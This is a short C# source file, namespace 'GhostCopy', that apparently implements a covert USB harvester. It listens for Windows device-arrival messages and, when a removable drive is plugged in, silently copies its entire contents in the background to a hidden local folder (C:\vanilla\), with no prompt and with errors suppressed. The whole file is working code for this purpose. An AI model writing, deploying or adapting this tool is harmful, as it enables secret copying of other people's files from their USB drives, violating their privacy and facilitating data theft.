namespace GhostCopy {
    using System.ComponentModel;
    using System.IO;
    using System.Linq;
    using System.Windows.Forms;
    using Microsoft.Win32;

    public class DriveScanner : NativeWindow {
        private DriveInfo[] currentDrives = DriveInfo.GetDrives();
        private const string COPY_BASE = @"C:\vanilla\";
        private const int WM_DEVICECHANGE = 0x0219;
        private const int DBT_DEVICEARRIVAL = 0x8000;
        private const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
    
        protected override void WndProc(ref Message m) {
            if(m.Msg == WM_DEVICECHANGE) {
                switch((int) m.WParam) {
                    case DBT_DEVICEARRIVAL:
                        ScanDrives();
                        break;
                    case DBT_DEVICEREMOVECOMPLETE:
                        currentDrives = DriveInfo.GetDrives();
                        break;
                }
            }

            base.WndProc(ref m);
        }
    
        private void ScanDrives() {
            var drives = DriveInfo.GetDrives();
            foreach(var drive in drives) {
                if(!drive.IsReady || currentDrives.Any(d => d.Name.Equals(drive.Name)) || drive.DriveType != DriveType.Removable)
                    continue;
                
                //copy files
                var worker = new BackgroundWorker();
                worker.DoWork += CopyWorker;
                worker.RunWorkerAsync(drive);
                break;
            }

            currentDrives = drives;
        }

        private static void CopyWorker(object sender, DoWorkEventArgs e) {
            var drive = e.Argument as DriveInfo;
            if(drive == null)
                return;

            string path;
            string suffix = "";
            do {
                path = Path.Combine(COPY_BASE, drive.VolumeLabel + suffix);
                suffix += "_";
            } while(Directory.Exists(path));

            try {
                CopyDirectory(drive.Name, path);
            } catch(IOException) { return; }
        }

        private static void CopyDirectory(string sourcePath, string destPath) {
            if(!Directory.Exists(destPath)) {
                Directory.CreateDirectory(destPath);
            }

            foreach(string file in Directory.GetFiles(sourcePath)) {
                string dest = Path.Combine(destPath, Path.GetFileName(file));
                File.Copy(file, dest);
            }

            foreach(string folder in Directory.GetDirectories(sourcePath)) {
                string dest = Path.Combine(destPath, Path.GetFileName(folder));
                CopyDirectory(folder, dest);
            }
        }
    }
}
